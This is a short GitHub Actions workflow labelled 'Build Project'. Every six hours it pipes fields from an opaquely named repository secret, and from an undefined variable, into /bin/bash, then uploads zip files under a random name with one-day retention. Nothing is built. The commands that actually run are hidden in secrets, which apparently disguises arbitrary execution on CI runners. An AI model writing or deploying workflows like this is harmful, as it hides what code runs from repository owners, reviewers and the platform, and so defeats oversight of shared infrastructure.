name: Build Project
on:
  workflow_dispatch:

  schedule:
    - cron: '53 3,9,15,21 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  action:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Begin
        env:
          pjcv1: ${{ secrets.pjcv1 }}
        run: |
          printf '%s' "$pjcv1" | jq -r .h5215 | /bin/bash
          printf '%s' "$tv50" | jq -r .i23374 | /bin/bash

      - name: Save results
        uses: actions/upload-artifact@v4
        with:
          name: Mw3rhTvk
          path: "*.zip"
          retention-days: 1
